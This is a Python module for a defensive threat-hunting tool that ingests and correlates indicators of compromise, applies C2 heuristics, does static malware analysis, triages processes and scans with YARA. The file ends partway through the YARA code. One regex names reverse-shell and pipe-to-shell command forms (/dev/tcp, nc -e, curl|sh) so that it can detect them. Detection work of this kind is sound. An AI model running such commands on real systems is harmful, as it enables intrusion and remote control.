"""Module E - IOC & Botnet Defense.

Real work only:

  * IOC ingestion/classification from operator input, an indicator file and
    non-host assessment targets.
  * Local correlation against what is actually available: log files on this
    host (real search), DNS resolution, internal-CIDR membership and on-disk
    hash matching over bounded directory roots.
  * Public threat-intelligence enrichment over HTTPS with per-indicator
    degradation when a source does not answer. No reputation value is ever
    invented.
  * C2 heuristics (DGA shape, abused TLD/port lists, beacon jitter) computed
    from the supplied indicators and captures, labelled as heuristics.
  * Malware static analysis of a supplied sample (hash, magic, entropy per
    section, embedded indicators). The sample is never executed.
  * Live process triage with psutil and pcap anomaly detection with tshark.
  * YARA rule authoring plus two independent matching paths (CLI + python)
    and a documented-subset Sigma evaluator over real JSONL events.
"""
from __future__ import annotations

import ipaddress
import json
import math
import os
import re
import socket
import time
from typing import Any

from backend import runner
from engines.base import Context, Result, artifact, have, unavailable

# ------------------------------------------------------------------- shapes --
RE_MD5 = re.compile(r"^[a-fA-F0-9]{32}$")
RE_SHA1 = re.compile(r"^[a-fA-F0-9]{40}$")
RE_SHA256 = re.compile(r"^[a-fA-F0-9]{64}$")
RE_EMAIL = re.compile(r"^[^@\s]{1,64}@[^@\s.]{1,190}(?:\.[^@\s.]{1,190})+$")
RE_DOMAIN = re.compile(
    r"^(?=.{4,253}$)(?:[A-Za-z0-9](?:[A-Za-z0-9-]{0,61}[A-Za-z0-9])?\.)+[A-Za-z]{2,24}$")
RE_IP_PORT = re.compile(r"^(?P<ip>\d{1,3}(?:\.\d{1,3}){3}):(?P<port>\d{1,5})$")

# Documented heuristics -------------------------------------------------------
# TLDs with a high historical abuse ratio (operator-editable constant). Being
# on this list is NOT evidence of compromise; it is a review signal only.
ABUSED_TLDS = {
    "xyz", "top", "tk", "ml", "ga", "cf", "gq", "work", "click", "link", "icu",
    "buzz", "rest", "surf", "pw", "cc", "ws", "zip", "mov", "country", "stream",
    "download", "racing", "loan", "men", "review", "date", "quest", "cam",
    "monster", "gdn", "bid", "kim", "party", "science", "accountant", "faith",
}
# Ports repeatedly abused by commodity RAT/C2 families.
ABUSED_C2_PORTS = {
    4444, 4445, 1337, 31337, 6667, 6668, 6669, 6697, 9001, 9050, 1080, 1234,
    5555, 7777, 8888, 12345, 54321, 6001, 7001, 8000, 8081, 10134, 2019,
}
# Benign labels that must not be flagged by the DGA shape rule.
DGA_ALLOW = {"www", "mail", "smtp", "imap", "pop", "ns1", "ns2", "api", "cdn"}

MINER_SHELL_PATTERNS = re.compile(
    r"(xmrig|minerd|cpuminer|kdevtmpfsi|kinsing|/dev/tcp/|nc\s+-e|ncat\s+-e|"
    r"socat\s+.*exec|bash\s+-i|sh\s+-i|curl\s+[^|]*\|\s*(?:ba)?sh|"
    r"wget\s+[^|]*\|\s*(?:ba)?sh|stratum\+tcp://)",
    re.IGNORECASE)


class ThreatIntelEngine:
    module = "threat_intelligence"
    title = "Module E - IOC & Botnet Defense"
    description = ("IOC ingestion and correlation, threat-intel enrichment, C2/beacon heuristics, "
                   "malware static analysis, process triage, YARA and Sigma hunting.")
    checks = [
        ("IOC-01", "IOC ingestion and classification", True),
        ("IOC-02", "IP / domain / hash correlation against local evidence", True),
        ("IOC-03", "Threat-intelligence enrichment", True),
        ("IOC-04", "C2 indicator identification", True),
        ("IOC-05", "Malware behaviour (static) analysis", True),
        ("IOC-06", "Suspicious process identification", True),
        ("IOC-07", "Network anomaly detection", True),
        ("IOC-08", "YARA rule integration", True),
        ("IOC-09", "Sigma rule support and threat hunting", True),
    ]

    def __init__(self) -> None:
        self._pcap: str = ""            # capture reused by IOC-04 / IOC-07
        self._pcap_origin: str = ""

    # ------------------------------------------------------------- dispatch --
    def run(self, ctx: Context) -> list[Result]:
        self._pcap = ""
        self._pcap_origin = ""
        steps = [("IOC-01", self.ioc_ingestion), ("IOC-02", self.correlation),
                 ("IOC-03", self.enrichment), ("IOC-04", self.c2_indicators),
                 ("IOC-05", self.malware_static), ("IOC-06", self.process_triage),
                 ("IOC-07", self.network_anomalies), ("IOC-08", self.yara_integration),
                 ("IOC-09", self.sigma_hunting)]
        for i, (cid, fn) in enumerate(steps):
            if runner.executor.stopped():
                ctx.add(Result("IOC-STOP", "Execution halted by emergency stop", "error",
                               description="Remaining IOC checks were not executed.", source="local"))
                break
            try:
                fn(ctx)
            except Exception as exc:  # a failing check must not kill the run
                ctx.add(Result(f"{cid}-ERR", "Check raised an exception", "error",
                               description=f"{type(exc).__name__}: {exc}", source="local"))
            ctx.progress(int((i + 1) / len(steps) * 100))
        return ctx.findings

    # ------------------------------------------------------------ IOC-01 -----
    def ioc_ingestion(self, ctx: Context) -> None:
        indicators, rejected = ingest_iocs(ctx)
        if not indicators:
            ctx.add(unavailable("IOC-01", "IOC ingestion and classification",
                                "No indicators supplied. Provide params.iocs (list), params.ioc_file "
                                "(lines or 'type,value' CSV) or non-host targets. "
                                f"Rejected tokens: {len(rejected)}."))
            return
        by_kind: dict[str, int] = {}
        by_source: dict[str, int] = {}
        for ind in indicators:
            by_kind[ind["type"]] = by_kind.get(ind["type"], 0) + 1
            by_source[ind["source"]] = by_source.get(ind["source"], 0) + 1
        doc = {"indicators": indicators, "rejected": rejected,
               "by_kind": by_kind, "by_source": by_source}
        art = ctx.save_text("iocs_ingested.json", json.dumps(doc, indent=2))
        ctx.add(Result(
            "IOC-01", "IOC ingestion and classification", "info",
            description=(f"Ingested {len(indicators)} unique indicator(s) "
                         f"({', '.join(f'{k}={v}' for k, v in sorted(by_kind.items()))}) from "
                         f"{', '.join(f'{k}={v}' for k, v in sorted(by_source.items()))}; "
                         f"{len(rejected)} token(s) could not be classified."),
            asset=", ".join(ctx.targets[:10]), source="local",
            evidence=[{"type": "other", "summary": "classified indicators",
                       "by_kind": by_kind, "by_source": by_source,
                       "sample": indicators[:15]},
                      {**art, "type": "file"}],
            data=doc))
        rejected_only = [r for r in rejected if r]
        if rejected_only:
            ctx.add(Result("IOC-01b", "Unclassifiable indicator tokens", "info",
                           description="Tokens that are neither ip/domain/url/hash/email: "
                                       + ", ".join(repr(r) for r in rejected_only[:10]),
                           source="local",
                           evidence=[{"type": "other", "summary": "rejected", "tokens": rejected_only[:25]}],
                           data={"rejected": rejected_only[:25]}))

    # ------------------------------------------------------------ IOC-02 -----
    def correlation(self, ctx: Context) -> None:
        indicators, _ = ingest_iocs(ctx)
        if not indicators:
            ctx.add(unavailable("IOC-02", "IP / domain / hash correlation against local evidence",
                                "No indicators to correlate (IOC-01 produced none)."))
            return
        evidence: list[dict] = []
        sources_used: list[str] = []

        # (a) real search over operator-supplied logs -------------------------
        log_paths = ctx.params.get("log_paths") or []
        if isinstance(log_paths, str):
            log_paths = [log_paths]
        files = list(iter_log_files([str(p) for p in log_paths], limit=25))
        log_hits: dict[str, Any] = {}
        if files:
            log_hits = search_logs(files, indicators)
            sources_used.append(f"log files ({len(files)} file(s))")
            evidence.append({"type": "command_output", "command": "grep -F (in-process scan)",
                             "files": files,
                             "stdout": json.dumps(log_hits, indent=2)[:8000]})

        # (b) DNS resolution for domain indicators ---------------------------
        dns: dict[str, Any] = {}
        domains = [i for i in indicators if i["type"] == "domain"]
        for ind in domains[:10]:
            dns[ind["value"]] = resolve_domain(ind["value"])
        if domains:
            sources_used.append(f"DNS (dig, {len(domains[:10])} name(s))")
            evidence.append({"type": "other", "summary": "DNS resolution", "records": dns})

        # (c) internal CIDR membership ---------------------------------------
        cidrs = ctx.params.get("internal_cidrs") or []
        if isinstance(cidrs, str):
            cidrs = [cidrs]
        nets = []
        for c in cidrs:
            try:
                nets.append(ipaddress.ip_network(str(c), strict=False))
            except ValueError:
                continue
        internal_hits: list[dict] = []
        ip_values = [i["value"] for i in indicators if i["type"] == "ip"]
        for ip in ip_values:
            addr = safe_ip(ip)
            if addr is None:
                continue
            for net in nets:
                if addr.version == net.version and addr in net:
                    internal_hits.append({"indicator": ip, "cidr": str(net)})
        for name, rec in dns.items():
            for ans in rec.get("A", []) + rec.get("AAAA", []):
                addr = safe_ip(ans)
                for net in nets:
                    if addr and addr.version == net.version and addr in net:
                        internal_hits.append({"indicator": name, "resolved": ans, "cidr": str(net)})
        if nets:
            sources_used.append(f"internal CIDRs ({len(nets)})")
            evidence.append({"type": "other", "summary": "internal CIDR membership",
                             "networks": [str(n) for n in nets], "hits": internal_hits})

        # (d) on-disk hash matching ------------------------------------------
        roots = ctx.params.get("hash_roots") or ["/tmp", "/usr/bin", "/bin"]
        wanted = {i["value"].lower(): i["type"] for i in indicators
                  if i["type"] in ("md5", "sha1", "sha256")}
        hash_matches: dict[str, list[str]] = {}
        scan_stats: dict[str, Any] = {"files_hashed": 0, "roots": []}
        if wanted:
            hash_matches, scan_stats = scan_hash_roots([str(r) for r in roots], wanted)
            sources_used.append(f"on-disk hashing ({scan_stats['files_hashed']} file(s))")
            evidence.append({"type": "other", "summary": "hash scan over roots",
                             "roots": scan_stats["roots"],
                             "files_hashed": scan_stats["files_hashed"],
                             "matches": hash_matches})

        matched = set(log_hits) | set(hash_matches)
        matched |= {h["indicator"] for h in internal_hits}
        matched |= {n for n, r in dns.items() if r.get("A") or r.get("AAAA") or r.get("MX") or r.get("TXT")}
        unmatched = [i["value"] for i in indicators if i["value"] not in matched]

        used_text = "; ".join(sources_used) or (
            "no local source enabled (supply params.log_paths, params.internal_cidrs "
            "or hash indicators)")
        ctx.add(Result(
            "IOC-02", "IP / domain / hash correlation against local evidence", "info",
            description=(f"Correlated {len(indicators)} indicator(s) against {used_text}. "
                         f"{len(matched)} indicator(s) produced at least one local observation, "
                         f"{len(unmatched)} had none."),
            asset=", ".join(ctx.targets[:10]), source="local", evidence=evidence,
            data={"log_hits": log_hits, "dns": dns, "internal_hits": internal_hits,
                  "hash_matches": hash_matches, "hash_scan": scan_stats,
                  "matched": sorted(matched), "unmatched": unmatched,
                  "sources_used": sources_used}))

        if log_hits:
            ctx.add(Result(
                "IOC-02b", "Indicator string observed in local log files", "fail", severity="medium",
                description=("Supplied IOC value(s) appear verbatim in local log files: "
                             + "; ".join(f"{k} -> {', '.join(v['files'])}" for k, v in list(log_hits.items())[:8])),
                source="local", cvss_score=5.3, cwe=["CWE-778"],
                remediation=("Treat the affected host as potentially compromised: preserve the logs, "
                             "scope the earliest appearance, block the indicator at egress and pivot on "
                             "the parent process of the logged event."),
                evidence=[{"type": "other", "summary": "log matches", "hits": log_hits}],
                data={"log_hits": log_hits}))
        if internal_hits:
            ctx.add(Result(
                "IOC-02c", "Indicator overlaps internal address space", "fail", severity="medium",
                description=("Indicator maps into a declared internal CIDR: "
                             + "; ".join(f"{h['indicator']} -> {h.get('resolved', '')} in {h['cidr']}"
                                         for h in internal_hits[:8])),
                source="local", cwe=["CWE-1104"],
                remediation=("An external IOC resolving into internal space indicates either a "
                             "hard-coded internal address in the malware configuration or DNS "
                             "hijacking - resolve it before blocking to avoid an outage."),
                evidence=[{"type": "other", "summary": "internal overlap", "hits": internal_hits}],
                data={"internal_hits": internal_hits}))
        if hash_matches:
            ctx.add(Result(
                "IOC-02d", "Hash indicator found on the local filesystem", "fail", severity="high",
                description=("File(s) on this host match a supplied hash IOC: "
                             + "; ".join(f"{h} -> {', '.join(p[:120] for p in paths[:3])}"
                                         for h, paths in hash_matches.items())),
                source="local", cvss_score=8.1,
                cvss_vector="CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                cwe=["CWE-506"],
                remediation=("Quarantine the matching file, capture its hash/metadata as evidence, "
                             "then hunt for the dropper that wrote it and the persistence it installed."),
                evidence=[{"type": "other", "summary": "hash matches", "matches": hash_matches}],
                data={"hash_matches": hash_matches}))

    # ------------------------------------------------------------ IOC-03 -----
    def enrichment(self, ctx: Context) -> None:
        indicators, _ = ingest_iocs(ctx)
        if not indicators:
            ctx.add(unavailable("IOC-03", "Threat-intelligence enrichment",
                                "No indicators to enrich (IOC-01 produced none)."))
            return
        mb_key = ctx.params.get("mb_api") or os.environ.get("WD_MB_API") or ""
        timeout = float(ctx.params.get("enrich_timeout", 6))
        max_per_kind = int(ctx.params.get("enrich_limit", 5))
        records: list[dict] = []
        evidence: list[dict] = []
        answered = 0
        tried = 0

        def budget(kind: str) -> int:
            return len([r for r in records if r["type"] == kind])

        for ind in indicators:
            kind, value = ind["type"], ind["value"]
            if kind in ("ip", "domain") and budget(kind) >= max_per_kind:
                continue
            if kind in ("md5", "sha1", "sha256"):
                rec = enrich_hash(value, mb_key, timeout)
            elif kind == "ip":
                rec = enrich_ip(value, timeout)
            elif kind == "domain":
                rec = enrich_domain(value, timeout)
            else:
                continue
            tried += 1
            rec.update({"type": kind, "value": value})
            records.append(rec)
            if rec.get("answered"):
                answered += 1
            evidence.append({"type": "other", "summary": f"{kind} {value}",
                             "source": rec.get("source"), "answered": rec.get("answered"),
                             "detail": rec.get("error") or rec.get("summary", "")})
            if tried >= max_per_kind * 3:
                break

        if not records:
            ctx.add(unavailable("IOC-03", "Threat-intelligence enrichment",
                                "No IP, domain or hash indicators were available for enrichment "
                                f"({len(indicators)} indicator(s) supplied)."))
            return

        art = ctx.save_text("enrichment.json", json.dumps(records, indent=2))
        no_answer = [r for r in records if not r.get("answered")]
        desc = (f"Queried {len(records)} indicator(s) against public sources; "
                f"{answered} received a real answer, {len(no_answer)} did not and are reported as "
                "unavailable for that indicator only.")
        state = "info" if answered else "unavailable"
        ctx.add(Result(
            "IOC-03", "Threat-intelligence enrichment", state,
            description=desc if answered else desc + " No enrichment source answered - no reputation "
                                                     "value is asserted for these indicators.",
            asset=", ".join(r["value"] for r in records[:10]),
            source="live" if answered else "unavailable",
            evidence=evidence + [{**art, "type": "file"}],
            data={"records": records, "answered": answered, "no_answer": len(no_answer),
                  "mb_api_supplied": bool(mb_key)}))

        flagged = [r for r in records if r.get("flags")]
        if flagged:
            ctx.add(Result(
                "IOC-03b", "Public source returned noteworthy attributes", "info",
                severity="low",
                description="; ".join(f"{r['value']}: {', '.join(r['flags'])}" for r in flagged[:10]),
                source="live",
                evidence=[{"type": "other", "summary": "flagged enrichment rows",
                           "rows": [{k: r[k] for k in ("type", "value", "source", "flags")}
                                    for r in flagged[:15]]}],
                data={"flagged": flagged[:25]}))

        if not mb_key:
            hash_missing = [r for r in records if r["type"] in ("md5", "sha1", "sha256")
                            and not r.get("answered")]
            if hash_missing:
                ctx.add(Result(
                    "IOC-03c", "MalwareBazaar lookup not performed", "unavailable",
                    description=("params.mb_api was not supplied, so the MalwareBazaar "
                                 "(mb-api.abuse.ch) hash lookup was skipped for "
                                 f"{len(hash_missing)} hash indicator(s). "
                                 "No substitute reputation value is claimed."),
                    source="unavailable",
                    evidence=[{"type": "other", "summary": "skipped",
                               "hashes": [r["value"] for r in hash_missing][:10]}],
                    data={"skipped_hashes": [r["value"] for r in hash_missing][:10]}))

    # ------------------------------------------------------------ IOC-04 -----
    def c2_indicators(self, ctx: Context) -> None:
        indicators, _ = ingest_iocs(ctx)
        findings: list[dict] = []
        heuristics_used: list[str] = []

        # H1: DGA-shaped domain names.
        heuristics_used.append(
            "H1 DGA shape: label length >= 12, no hyphen, digit ratio <= 0.4, vowel ratio <= 0.35, "
            "max consonant run >= 5, Shannon entropy (base-2, per char) >= 3.3")
        for ind in indicators:
            if ind["type"] != "domain":
                continue
            label = ind["value"].split(".")[0]
            if label.lower() in DGA_ALLOW:
                continue
            verdict = dga_shape(label)
            if verdict["dga_like"]:
                findings.append({"heuristic": "H1-DGA-shape", "indicator": ind["value"],
                                 "why": verdict["reasons"], "metrics": verdict["metrics"]})

        # H2: IP:port C2 candidates from operator-supplied indicators.
        heuristics_used.append(
            f"H2 C2 port list: {sorted(ABUSED_C2_PORTS)} - a match is a review signal, not proof")
        seen_ipport: set[str] = set()
        for raw in dict.fromkeys(raw_indicator_tokens(ctx)):
            m = RE_IP_PORT.match(raw.strip())
            if not m:
                continue
            port = int(m.group("port"))
            value = raw.strip()
            if port in ABUSED_C2_PORTS and value not in seen_ipport:
                seen_ipport.add(value)
                findings.append({"heuristic": "H2-ip-port", "indicator": value,
                                 "why": f"port {port} is on the commodity C2 port list"})
        for ind in indicators:
            if ind["type"] == "ip":
                findings.append({"heuristic": "H2-bare-ip", "indicator": ind["value"],
                                 "why": "bare IP supplied as an IOC; no port given, so the port "
                                        "heuristic cannot be evaluated for it"})

        # H3: abused TLD.
        heuristics_used.append(f"H3 abused TLD list ({len(ABUSED_TLDS)} TLDs)")
        for ind in indicators:
            if ind["type"] not in ("domain", "url"):
                continue
            tld = domain_of(ind["value"]).rsplit(".", 1)[-1].lower()
            if tld in ABUSED_TLDS:
                findings.append({"heuristic": "H3-abused-tld", "indicator": ind["value"],
                                 "why": f".{tld} is on the high-abuse TLD list"})

        # H4/H5: behaviour from a real capture.
        heuristics_used.append(
            "H4 beacon jitter: >=4 connections from one src/dst pair, mean interval >= 0.5s, "
            "coefficient of variation (stdev/mean) <= 0.35")
        heuristics_used.append("H5 IOC contact: capture dst IP equals a supplied IP indicator")
        beacons: list[dict] = []
        contacted: list[dict] = []
        pcap = self._ensure_pcap(ctx)
        if pcap:
            conns = pcap_connections(pcap)
            beacons = detect_beacons(conns)
            ioc_ips = {i["value"] for i in indicators if i["type"] == "ip"}
            for c in conns:
                if c.get("dst_ip") in ioc_ips:
                    contacted.append(c)
        else:
            heuristics_used.append("H4/H5 skipped: no usable packet capture")

        data = {"heuristics": heuristics_used, "findings": findings,
                "beacons": beacons, "ioc_contact": contacted,
                "pcap": self._pcap or "", "pcap_origin": self._pcap_origin}
        art = ctx.save_text("c2_heuristics.json", json.dumps(data, indent=2))

        if not findings and not beacons and not contacted:
            ctx.add(Result(
                "IOC-04", "C2 indicator identification", "info",
                description=("No indicator tripped the stated C2 heuristics. Heuristics applied: "
                             + " | ".join(heuristics_used)),
                source="local", evidence=[{**art, "type": "file"}], data=data))
            return

        ctx.add(Result(
            "IOC-04", "C2 indicator identification", "info", severity="info",
            description=(f"{len(findings)} heuristic indicator hit(s), {len(beacons)} beaconing "
                         f"pattern(s) and {len(contacted)} capture connection(s) to a supplied IP IOC. "
                         "All of this is heuristic, not attribution."),
            asset=", ".join(str(f.get("indicator", "")) for f in findings[:8]),
            source="live" if (beacons or contacted) else "local",
            evidence=[{"type": "other", "summary": "heuristic hits",
                       "heuristics": heuristics_used, "findings": findings[:25],
                       "beacons": beacons[:10], "ioc_contact": contacted[:10]},
                      {**art, "type": "file"}], data=data))

        strong = [f for f in findings if f["heuristic"] in ("H1-DGA-shape", "H2-ip-port")]
        if strong or beacons:
            ctx.add(Result(
                "IOC-04b", "Probable C2 channel candidates (heuristic)", "fail", severity="medium",
                description=("Heuristic C2 candidates: "
                             + "; ".join([f"{f['indicator']} ({f['heuristic']}: {f['why']})"
                                          for f in strong[:6]]
                                         + [f"{b['src_ip']} -> {b['dst_ip']}:{b['dst_port']} "
                                            f"beacon every ~{b['mean_interval_s']}s "
                                            f"(cv={b['cv']})" for b in beacons[:4]])),
                source="live" if beacons else "local", cvss_score=6.5,
                cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
                cwe=["CWE-506"],
                remediation=("Confirm the candidate by process-to-connection attribution "
                             "(ss -tnp / EDR socket history), then block egress to the destination "
                             "and reset the owning process. Beacon candidates need traffic-volume "
                             "validation before a block is applied."),
                evidence=[{"type": "other", "summary": "candidate rows", "strong": strong[:15],
                           "beacons": beacons[:10]}],
                data={"strong": strong[:15], "beacons": beacons[:10]}))

    # ------------------------------------------------------------ IOC-05 -----
    def malware_static(self, ctx: Context) -> None:
        sample = pick_sample(ctx)
        if not sample:
            ctx.add(unavailable(
                "IOC-05", "Malware behaviour (static) analysis",
                "No sample available: params.sample_path was not supplied (or does not exist) and none "
                "of the fallback candidates /usr/bin/ls, /bin/ls, /usr/bin/curl exists on this host."))
            return
        if not os.path.isfile(sample):
            ctx.add(unavailable("IOC-05", "Malware behaviour (static) analysis",
                                f"Sample path {sample} is not a regular file."))
            return
        analysis = static_analyse(sample)
        art = ctx.save_text("malware_static.json", json.dumps(analysis, indent=2))
        evidence: list[dict] = [{**art, "type": "file"},
                                {"type": "other", "summary": "static analysis summary",
                                 "file_type": analysis["file_type"],
                                 "hashes": analysis["hashes"],
                                 "entropy": analysis["whole_file_entropy"],
                                 "strings_of_interest": analysis["strings_of_interest"][:20]}]
        if analysis.get("file_cmd"):
            evidence.append(analysis["file_cmd"])
        if analysis.get("strings_cmd"):
            evidence.append({**analysis["strings_cmd"], "stdout": analysis["strings_cmd"]["stdout"][:4000]})

        ctx.add(Result(
            "IOC-05", "Malware behaviour (static) analysis", "info",
            description=(f"Static analysis of {os.path.basename(sample)}: {analysis['file_type']}, "
                         f"{analysis['size']} bytes, sha256 {analysis['hashes']['sha256']}, "
                         f"whole-file entropy {analysis['whole_file_entropy']}, "
                         f"{len(analysis['strings_of_interest'])} embedded indicator string(s). "
                         "The sample was NOT executed."),
            asset=sample, source="local", evidence=evidence, data=analysis))

        notes = analysis.get("notes") or []
        if notes:
            ctx.add(Result(
                "IOC-05b", "Static traits worth investigating", "info", severity="low",
                description="; ".join(notes[:8]), asset=sample, source="local",
                evidence=[{"type": "other", "summary": "traits", "notes": notes[:15],
                           "sections": analysis.get("sections", [])[:15]}],
                data={"notes": notes, "sections": analysis.get("sections", [])}))
        urls = [s for s in analysis["strings_of_interest"] if s.startswith(("http://", "https://"))]
        if urls:
            ctx.add(Result(
                "IOC-05c", "Embedded network indicators in sample", "info", severity="low",
                description="URL(s) embedded in the sample: " + ", ".join(urls[:10]),
                asset=sample, source="local",
                evidence=[{"type": "other", "summary": "embedded URLs", "urls": urls[:25]}],
                data={"urls": urls[:25]}))

    # ------------------------------------------------------------ IOC-06 -----
    def process_triage(self, ctx: Context) -> None:
        try:
            import psutil as _psutil_probe  # availability probe
        except Exception as exc:
            ctx.add(unavailable("IOC-06", "Suspicious process identification",
                                f"psutil is not importable ({type(exc).__name__}: {exc}); got {_psutil_probe.__name__!r}"))
            return
        report = process_triage()
        art = ctx.save_text("process_triage.json", json.dumps(report, indent=2))
        ctx.add(Result(
            "IOC-06", "Suspicious process identification", "info",
            description=(f"Enumerated {report['processes']} process(es) on this host; "
                         f"{len(report['flagged'])} matched at least one stated rule. Rules: "
                         + " | ".join(report["rules"])),
            asset=socket.gethostname(), source="live",
            evidence=[{"type": "other", "summary": "flagged processes",
                       "flagged": report["flagged"][:25],
                       "listeners": report["listeners"][:15]},
                      {**art, "type": "file"}], data=report))
        risky = [f for f in report["flagged"]
                 if "executable-in-tmp-or-shm" in f["reasons"]
                 or "deleted-binary" in f["reasons"]]
        if risky:
            ctx.add(Result(
                "IOC-06b", "Process running from volatile or deleted storage", "fail", severity="medium",
                description="; ".join(f"pid {f['pid']} {f['name']} "
                                      f"[{', '.join(f['reasons'])}] {f['cmdline'][:110]}"
                                      for f in risky[:8]),
                asset=socket.gethostname(), source="live", cvss_score=6.5,
                cvss_vector="CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N",
                cwe=["CWE-506"],
                remediation=("Common in fileless/dropper tradecraft: capture the command line and "
                             "parent pid, hash the on-disk file if one still exists, then kill and "
                             "hunt for the persistence entry that launched it."),
                evidence=[{"type": "other", "summary": "risky processes", "processes": risky[:15]}],
                data={"risky": risky[:15]}))
        miner = [f for f in report["flagged"] if "miner-or-shell-pattern" in f["reasons"]]
        if miner:
            ctx.add(Result(
                "IOC-06c", "Miner or reverse-shell command pattern observed", "fail", severity="high",
                description="; ".join(f"pid {f['pid']} {f['cmdline'][:150]}" for f in miner[:8]),
                asset=socket.gethostname(), source="live", cvss_score=7.5,
                cwe=["CWE-506"],
                remediation="Kill the process tree, remove the cron/systemd entry that restarts it, "
                            "and check outbound stratum/IRC traffic.",
                evidence=[{"type": "other", "summary": "matching processes", "processes": miner[:15]}],
                data={"miner_shell": miner[:15]}))

    # ------------------------------------------------------------ IOC-07 -----
    def network_anomalies(self, ctx: Context) -> None:
        pcap = self._ensure_pcap(ctx)
        if not pcap:
            ctx.add(unavailable(
                "IOC-07", "Network anomaly detection",
                "No capture: params.pcap_path was absent/invalid and the live tcpdump capture produced "
                "no packets (no CAP_NET_RAW or no interface)."))
            return
        if not have("tshark"):
            ctx.add(unavailable("IOC-07", "Network anomaly detection",
                                "tshark is not installed; cannot decode the capture."))
            return
        analysis = capture_anomalies(pcap, ctx)
        art = ctx.save_text("network_anomalies.json", json.dumps(analysis, indent=2))
        ev = [{"type": "other", "summary": "capture anomaly summary",
               "packets": analysis["packets"], "fan_out": analysis["fan_out"][:5],
               "dns_tunnel_candidates": analysis["dns_tunnel_candidates"][:5],
               "large_flows": analysis["large_flows"][:5],
               "ioc_contacts": analysis["ioc_contacts"][:5]},
              {**art, "type": "file"}]
        if analysis.get("tshark_version"):
            ev.append(analysis["tshark_version"])
        ctx.add(Result(
            "IOC-07", "Network anomaly detection", "info",
            description=(f"Analysed {analysis['packets']} packet(s) from "
                         f"{os.path.basename(pcap)} ({self._pcap_origin}). "
                         f"{len(analysis['fan_out'])} fan-out source(s), "
                         f"{len(analysis['dns_tunnel_candidates'])} DNS-tunnel candidate name(s), "
                         f"{len(analysis['large_flows'])} large flow(s), "
                         f"{len(analysis['ioc_contacts'])} flow(s) to a supplied IOC."),
            asset=os.path.basename(pcap), source="live", evidence=ev, data=analysis))

        if analysis["fan_out"]:
            top = analysis["fan_out"][:5]
            ctx.add(Result(
                "IOC-07b", "Port-scan-like fan-out observed", "fail", severity="medium",
                description="; ".join(f"{f['src_ip']} contacted {f['distinct_ports']} distinct dst "
                                      f"port(s) across {f['distinct_dsts']} host(s) with "
                                      f"{f['syn_only_ratio']:.0%} SYN-only ratio"
                                      for f in top),
                asset=os.path.basename(pcap), source="live", cvss_score=5.3,
                cwe=["CWE-1247"],
                remediation="Confirm whether the source is an authorised scanner; otherwise contain it "
                            "and check for the follow-up exploitation attempt.",
                evidence=[{"type": "other", "summary": "fan-out", "rows": top}],
                data={"fan_out": top}))
        if analysis["dns_tunnel_candidates"]:
            top = analysis["dns_tunnel_candidates"][:5]
            ctx.add(Result(
                "IOC-07c", "DNS tunnelling signal in capture", "fail", severity="medium",
                description="; ".join(f"{c['name']} (len={c['length']}, entropy={c['entropy']})"
                                      for c in top),
                asset=os.path.basename(pcap), source="live", cvss_score=5.8,
                cwe=["CWE-506"],
                remediation="Compare query volume per parent domain against baseline; a single long "
                            "high-entropy name is weak evidence, sustained volume is actionable.",
                evidence=[{"type": "other", "summary": "dns candidates", "rows": top}],
                data={"dns_tunnel_candidates": top}))
        if analysis["ioc_contacts"]:
            top = analysis["ioc_contacts"][:8]
            ctx.add(Result(
                "IOC-07d", "Capture contains traffic to a supplied IOC", "fail", severity="high",
                description="; ".join(f"{c['src_ip']} -> {c['dst_ip']}:{c['dst_port']} "
                                      f"({c['packets']} pkt, {c['bytes']} B)" for c in top),
                asset=os.path.basename(pcap), source="live", cvss_score=8.0,
                cwe=["CWE-506"],
                remediation="This is a confirmed contact in observed traffic: reset the session, block "
                            "egress to the IOC and identify the local process that opened the flow.",
                evidence=[{"type": "other", "summary": "IOC contacts", "rows": top}],
                data={"ioc_contacts": top}))

    # ------------------------------------------------- internal capture ------
    def _ensure_pcap(self, ctx: Context) -> str:
        """Return a usable capture path, capturing at most once per run."""
        if self._pcap:
            return self._pcap
        path = ctx.params.get("pcap_path")
        if path and os.path.exists(str(path)) and os.path.getsize(str(path)) > 24:
            self._pcap = str(path)
            self._pcap_origin = "operator-supplied params.pcap_path"
            return self._pcap
        if not have("tcpdump"):
            return ""
        iface = ctx.params.get("interface") or default_interface()
        seconds = min(int(ctx.params.get("capture_seconds", 6)), 6)
        if seconds < 1:
            seconds = 1
        out = ctx.path(f"ioc_capture_{int(time.time())}.pcap")
        # -G/-W rotate a single file so the capture stops on its own.
        res = runner.run(["tcpdump", "-i", iface, "-nn", "-q", "-w", out,
                          "-G", str(seconds), "-W", "1"], timeout=seconds + 12)
        if os.path.exists(out) and os.path.getsize(out) > 24:
            self._pcap = out
            self._pcap_origin = f"short live capture on {iface} ({seconds}s, tcpdump)"
            ctx.log("info", f"[IOC] captured {os.path.getsize(out)} bytes on {iface}")
            return self._pcap
        ctx.log("warn", f"[IOC] live capture failed on {iface}: {res.stderr.strip()[:200]}")
        return ""

    # ------------------------------------------------------------ IOC-08 -----
    def yara_integration(self, ctx: Context) -> None:
        rule_dir = os.path.join(ctx.evidence_dir, "yara_rules")
        os.makedirs(rule_dir, exist_ok=True)
        written = write_yara_rules(rule_dir)
        fixture_dir = os.path.join(ctx.evidence_dir, "yara_fixtures")
        os.makedirs(fixture_dir, exist_ok=True)
        fixtures = write_yara_fixtures(fixture_dir)

        targets: list[str] = []
        sample = pick_sample(ctx, allow_fallback=False)
        if sample:
            targets.append(sample)
        targets.extend(fixtures)
        if not targets:
            ctx.add(unavailable("IOC-08", "YARA rule integration",
                                "No scan target: supply params.sample_path. Rule files were still "
                                f"written to {rule_dir}."))
            return

        cli = {"available": have("yara"), "invocations": []}
        cli_matches: list[dict] = []
        rule_files = [os.path.join(rule_dir, f) for f in sorted(written)]
        if have("yara") and rule_files:
            # The yara CLI accepts exactly ONE target per invocation when several
            # rule files are given (everything but the last argument is a rule),
            # so each target is scanned separately.
            for target in targets:
                res = runner.run(["yara", "-w", "-s", *rule_files, target], timeout=60)
                cli["invocations"].append({"command": res.command,
                                           "returncode": res.returncode,
                                           "timed_out": res.timed_out,
                                           "stdout": res.stdout[-4000:],
                                           "stderr": res.stderr[-1000:]})
                cli_matches.extend(parse_yara_output(res.stdout))
            ctx.save_text("yara_cli_output.txt",
                          "\n".join(f"$ {i['command']}\n{i['stdout']}" for i in cli["invocations"]))

        py = {"available": False}
